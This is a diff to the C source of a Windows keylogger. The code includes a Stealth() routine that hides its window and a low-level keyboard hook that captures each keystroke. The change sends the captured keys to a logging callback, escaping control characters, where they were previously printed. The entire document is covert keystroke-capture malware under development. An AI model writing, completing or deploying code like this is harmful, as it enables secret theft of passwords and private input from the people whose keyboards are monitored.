@@ -2,6 +2,11 @@
 #include <windows.h>
 #include <winuser.h>
 
+#include "winkey.h"
+
+#define BACKSPACE_CHAR 8
+#define CARRETE_RETURN_CHAR 13
+
 void Stealth()
 {
     HWND Stealth;
@@ -12,7 +17,7 @@ void Stealth()
 
 HHOOK hHook;
 
-void PrintKeyName(DWORD vkCode)
+void LogKeyName(DWORD vkCode, void (*log)(char *))
 {
     BYTE keyState[256];
     WCHAR keyName[2] = {0};
@@ -30,7 +35,29 @@ void PrintKeyName(DWORD vkCode)
 
     if (result > 0)
     {
-        printf("Character: %c\n", keyName[0]);
+        const char *res;
+
+        switch (keyName[0])
+        {
+        case '\n':
+            res = "\\n";
+            break;
+        case CARRETE_RETURN_CHAR:
+            res = "\\n";
+            break;
+        case BACKSPACE_CHAR:
+            res = "\\b";
+            break;
+
+        case '\t':
+            res = "\\t";
+            break;
+        default:
+            res = keyName;
+            break;
+        }
+
+        log(res);
     }
     else
     {
@@ -40,10 +67,6 @@ void PrintKeyName(DWORD vkCode)
         if (textResult > 0)
         {
             printf("key name: %s\n", keyNameText);
-        }
-        else
-        {
-            printf("Error on key mapping :P.\n");
         }
     }
 }
@@ -56,7 +79,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         {
             KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
             DWORD vkCode = pKeyboard->vkCode;
-            PrintKeyName(vkCode);
+            LogKeyName(vkCode, &log);
         }
         return CallNextHookEx(hHook, nCode, wParam, lParam);
     }
